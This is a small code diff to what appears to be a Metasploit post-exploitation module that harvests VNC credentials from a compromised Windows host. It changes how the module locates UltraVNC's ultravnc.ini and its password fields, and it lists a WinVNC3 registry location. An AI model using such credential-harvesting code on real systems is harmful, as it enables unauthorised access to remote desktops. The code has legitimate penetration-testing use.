@@ -98,15 +98,11 @@ class Metasploit3 < Msf::Post
     locations = []
 
     #Checks
-    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)')
-    progfiles_env.each do |k, v|
-      next if v.blank?
-      locations << {:name => 'UltraVNC',
-        :check_file => "#{v}\\UltraVNC\\ultravnc.ini",
-        :pass_variable => 'passwd=',
-        :viewonly_variable => 'passwd2=',
-        :port_variable => 'PortNumber='}
-    end
+    locations << {:name => 'UltraVNC',
+      :check_file => session.fs.file.expand_path("%PROGRAMFILES%")+'\\UltraVNC\\ultravnc.ini',
+      :pass_variable => 'passwd=',
+      :viewonly_variable => 'passwd2=',
+      :port_variable => 'PortNumber='}
 
     locations << {:name => 'WinVNC3_HKLM',
       :check_reg => 'HKLM\\Software\\ORL\\WinVNC3',
